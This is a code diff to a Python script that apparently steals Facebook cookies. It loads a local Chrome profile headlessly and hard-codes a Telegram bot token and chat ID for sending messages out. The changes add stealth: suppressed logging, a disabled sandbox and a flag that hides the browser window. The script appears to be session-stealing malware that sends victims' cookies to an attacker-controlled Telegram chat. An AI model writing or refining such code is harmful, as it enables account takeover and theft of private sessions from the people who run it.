@@ -10,11 +10,12 @@ from selenium.webdriver.support.ui import WebDriverWait
 from selenium.webdriver.support import expected_conditions as EC
 import requests
 
+os.environ['WDM_LOG'] = '0'
+os.environ['WDM_LOG_LEVEL'] = '0'
+
 TOKEN = '7533821284:AAGDsLUDpZYbfzdghq8QihpeHXfhzGIP43I'
 CHAT_ID = '1174455752'
 TELEGRAM_API = f'https://api.telegram.org/bot{TOKEN}/sendMessage'
-
-os.environ['WDM_LOG'] = '0'
 
 def install_libraries():
     required_libs = ["requests", "webdriver_manager", "selenium"]
@@ -40,9 +41,12 @@ def get_cookies(profile_name):
     chrome_options.add_argument("--headless")
     chrome_options.add_argument("--log-level=3")
     chrome_options.add_argument("--disable-logging")
+    chrome_options.add_argument("--no-sandbox")
+    chrome_options.add_argument("--disable-dev-shm-usage")
     try:
         service = Service(ChromeDriverManager().install())
         service.log_path = os.devnull
+        service.creationflags = 0x08000000  # CREATE_NO_WINDOW flag
         driver = webdriver.Chrome(service=service, options=chrome_options)
         driver.get('https://www.facebook.com/')
         WebDriverWait(driver, 5).until(EC.presence_of_element_located((By.TAG_NAME, "body")))
